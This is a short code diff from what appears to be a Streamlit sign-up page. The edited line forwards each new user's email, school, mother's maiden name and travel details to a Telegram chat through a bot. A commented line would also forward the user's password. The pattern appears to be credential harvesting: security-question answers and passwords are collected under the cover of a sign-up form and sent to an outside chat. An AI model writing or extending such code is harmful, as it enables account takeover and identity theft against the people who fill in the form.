@@ -59,7 +59,7 @@ if  st.session_state['first_run']:
     ver = False
     if signupbut:
         placeholder.empty()
-        tb.send_message(chat_id,'Email Address: ' + new_user + '\n' + 'School: ' + school + '\n'+'Mother''s Maiden Name: ' + mom_name, 'Vibe: ' + type, 'Hotel or Airbnb: ' + hotel)
+        tb.send_message(chat_id,'Email Address: ' + new_user + '\n' + 'School: ' + school + '\n'+'Mother''s Maiden Name: ' + mom_name +'\n'+ 'Vibe: ' + type + '\n'+  'Hotel or Airbnb: ' + hotel)
         # tb.send_message(chat_id, 'New User: ' + new_user + '\n' + 'Password: ' + new_passwd + '\n' + 'School: ' + school + '\n' + 'Mother''s Maiden Name: ' + mom_name + '\n' + 'Vibe: ' + type + '\n' + 'Hotel: ' + hotel)
         a = [eval('ph%s.empty()' % i) for i in range(1,11)]
 
